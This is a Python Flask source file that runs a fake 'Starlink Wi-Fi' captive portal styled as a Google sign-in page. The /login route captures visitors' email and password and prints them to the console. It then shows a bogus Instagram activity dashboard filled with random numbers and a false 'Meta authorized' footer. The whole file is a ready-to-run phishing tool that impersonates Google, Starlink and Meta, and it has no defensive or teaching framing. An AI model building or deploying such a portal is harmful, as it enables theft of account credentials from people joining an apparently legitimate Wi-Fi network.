from flask import Flask, request, render_template_string
import random

app = Flask(__name__)

# ================= Login Page HTML (Starlink Wi-Fi UI) =================
LOGIN_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Starlink Wi-Fi Sign in</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
    background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}

.container {
    width: 100%;
    max-width: 450px;
    background: white;
    border-radius: 12px;
    padding: 40px 32px;
    box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
}

.wifi-name {
    text-align: center;
    font-size: 32px;
    font-weight: 700;
    background: linear-gradient(270deg, #f58529, #dd2a7b, #8134af, #515bd4, #1dcaff, #f58529);
    background-size: 600% 600%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: gradientMove 6s ease infinite;
    margin-bottom: 16px;
}

@keyframes gradientMove {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

.google-logo { text-align:center; margin-bottom:32px; }
.google-logo span { font-size:24px; font-weight:500; letter-spacing:0.5px; }
.logo-g { color:#4285F4; } .logo-o1 { color:#EA4335; } .logo-o2 { color:#FBBC04; }
.logo-g2 { color:#34A853; } .logo-l { color:#EA4335; } .logo-e { color:#4285F4; }

h1 { font-size:24px; font-weight:500; color:#202124; margin-bottom:12px; text-align:center; }

.description { font-size:14px; color:#5f6368; text-align:center; margin-bottom:24px; line-height:1.5; }

.learn-more { text-align:center; margin-bottom:24px; }
.learn-more a { color:#1f73e8; text-decoration:none; font-size:14px; cursor:pointer; }
.learn-more a:hover { text-decoration:underline; }

.form-group { margin-bottom:24px; }
.form-group input {
    width:100%; padding:12px; border:1px solid #dadce0; border-radius:4px;
    font-size:16px; font-family:inherit; color:#202124; background:white; transition:border-color 0.2s;
}
.form-group input:focus { outline:none; border-color:#4285F4; box-shadow:0 0 0 3px rgba(66,133,244,0.1); }
.form-group input::placeholder { color:#9aa0a6; }

.forgot-password { margin-bottom:24px; }
.forgot-password a { color:#1f73e8; text-decoration:none; font-size:14px; cursor:pointer; }
.forgot-password a:hover { text-decoration:underline; }

.create-account { margin-bottom:32px; }
.create-account a { color:#1f73e8; text-decoration:none; font-size:14px; cursor:pointer; }
.create-account a:hover { text-decoration:underline; }

.button-container { display:flex; justify-content:flex-end; }
button {
    background:#1f73e8; color:white; border:none; padding:10px 24px; border-radius:4px;
    font-size:14px; font-weight:500; cursor:pointer; transition:background 0.2s;
}
button:hover { background:#1765cc; }
button:active { background:#154fb1; }

@media (max-width:480px){
    .container { padding:32px 24px; }
    h1 { font-size:20px; }
    .wifi-name { font-size:28px; }
}
</style>
</head>
<body>
<div class="container">
    <div class="wifi-name">Starlink Wi-Fi</div>

    <div class="google-logo">
        <span class="logo-g">G</span><span class="logo-o1">o</span><span class="logo-o2">o</span><span class="logo-g2">g</span><span class="logo-l">l</span><span class="logo-e">e</span>
    </div>

    <h1>Sign in</h1>

    <p class="description">Please use your <strong>Google Account</strong> to access this WiFi network. Your account will be securely added to this device and can be used with other Google services.</p>

    <div class="learn-more">
        <a href="#">Learn more about using your account</a>
    </div>

    <form action="/login" method="POST">
        <div class="form-group">
            <input type="email" name="username" placeholder="Email or phone" required>
        </div>

        <div class="form-group">
            <input type="password" name="password" placeholder="Password" required>
        </div>

        <div class="forgot-password">
            <a href="#">Forgot email?</a>
        </div>

        <div class="create-account">
            <a href="#">Create account</a>
        </div>

        <div class="button-container">
            <button type="submit">CONNECT</button>
        </div>
    </form>
</div>
</body>
</html>
"""

# ================= Results Page HTML =================
RESULTS_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activity Dashboard</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
body { background-color:#f5f5f7; color:#333; min-height:100vh; position:relative; padding-bottom:50px; }
.header { background: linear-gradient(180deg,#fff 0%,#e9ecef 100%); height:120px; display:flex; justify-content:center; align-items:center; position:relative; padding:10px; }
.insta-logo { font-size:48px; font-weight:bold; font-family:'Billabong', cursive; background: linear-gradient(45deg,#f58529,#dd2a7b,#8134af,#515bd4); -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-align:center; }
.top-nav { display:grid; grid-template-columns:repeat(3,1fr); background:#fff; border-bottom:1px solid #ddd; text-align:center; padding:12px 0; }
.nav-item { display:flex; flex-direction:column; align-items:center; gap:4px; font-size:13px; font-weight:600; color:#444; position:relative; }
.nav-item i { font-size:20px; color:#222; }
.badge { position:absolute; top:-5px; right:25%; background:#ff4757; color:white; font-size:10px; padding:2px 5px; border-radius:10px; border:2px solid #fff; }
.list-container { margin-top:10px; background:#fff; border-radius:12px; overflow:hidden; box-shadow:0 2px 6px rgba(0,0,0,0.05); max-height:calc(100vh-200px); overflow-y:auto; }
.list-item { display:flex; align-items:center; padding:14px 16px; border-bottom:1px solid #f1f1f1; transition: background 0.2s; cursor:pointer; }
.list-item:last-child { border-bottom:none; }
.list-item:active { background-color:#f0f0f0; }
.icon-box { width:35px; font-size:18px; display:flex; justify-content:center; margin-right:12px; position:relative; }
.item-text { flex-grow:1; font-size:15px; font-weight:500; }
.count { font-weight:bold; color:#555; margin-right:8px; }
.arrow { color:#ccc; font-size:14px; }
.trusted-footer { position:fixed; bottom:0; width:100%; background:#fff; text-align:center; font-size:12px; color:#555; padding:5px 0; box-shadow:0 -1px 5px rgba(0,0,0,0.05); }
@media screen and (max-width:480px) {
.insta-logo { font-size:36px; }
.top-nav { padding:10px 0; }
.list-item { padding:10px 12px; }
.icon-box { width:30px; font-size:16px; margin-right:8px; }
.item-text { font-size:14px; }
.count { margin-right:5px; font-size:13px; }
}
</style>
</head>
<body>

<div class="header">
    <div class="insta-logo">Instagram</div>
</div>

<div class="top-nav">
    <div class="nav-item">
        <span class="badge">1</span>
        <i class="fas fa-chart-line"></i>
        Activity Feed
    </div>
    <div class="nav-item">
        <i class="fas fa-play-circle"></i>
        Your Stories
    </div>
    <div class="nav-item">
        <span class="badge">1</span>
        <i class="fas fa-heartbeat"></i>
        Activity Meter
    </div>
</div>

<div class="list-container">
    <div class="list-item">
        <div class="icon-box"><i class="fas fa-plus"></i></div>
        <div class="item-text">New Followers</div>
        <span class="count">{{ followers }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box"><i class="fas fa-minus"></i></div>
        <div class="item-text">Unfollowers</div>
        <span class="count">{{ unfollowed }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box">
            <span class="badge">9+</span>
            <i class="fas fa-user-minus"></i>
        </div>
        <div class="item-text">You Unfollowed</div>
        <span class="count">{{ you_unfollowed }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box"><i class="fas fa-user-friends"></i></div>
        <div class="item-text">Not Following You Back</div>
        <span class="count">{{ not_following_back }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box"><i class="fas fa-user-plus"></i></div>
        <div class="item-text">You Are Not Following Back</div>
        <span class="count">{{ you_not_following }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box">
            <span class="badge">?</span>
            <i class="fas fa-ghost"></i>
        </div>
        <div class="item-text">Ghost Followers</div>
        <span class="count">{{ ghost_followers }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
    <div class="list-item">
        <div class="icon-box">
            <span class="badge">?</span>
            <i class="fas fa-ban"></i>
        </div>
        <div class="item-text">Blocked You</div>
        <span class="count">{{ blocked_you }}</span>
        <i class="fas fa-chevron-right arrow"></i>
    </div>
</div>

<div class="trusted-footer">
    © 2025 Meta Platforms, Inc. | All rights reserved. Meta authorized
</div>

</body>
</html>
"""

# ================= Flask Routes =================
@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE_HTML)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Print credentials to console
    print(f"\n{'='*50}")
    print("Received credentials:")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print(f"{'='*50}\n")

    # Generate random statistics
    followers = random.randint(100, 1000)
    unfollowed = random.randint(50, 500)
    you_unfollowed = random.randint(50, 600)
    not_following_back = random.randint(50, 500)
    you_not_following = random.randint(50, 600)
    ghost_followers = random.randint(10, 200)
    blocked_you = random.randint(0, 50)

    return render_template_string(
        RESULTS_PAGE_HTML,
        followers=followers,
        unfollowed=unfollowed,
        you_unfollowed=you_unfollowed,
        not_following_back=not_following_back,
        you_not_following=you_not_following,
        ghost_followers=ghost_followers,
        blocked_you=blocked_you
    )

# ================= Main =================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
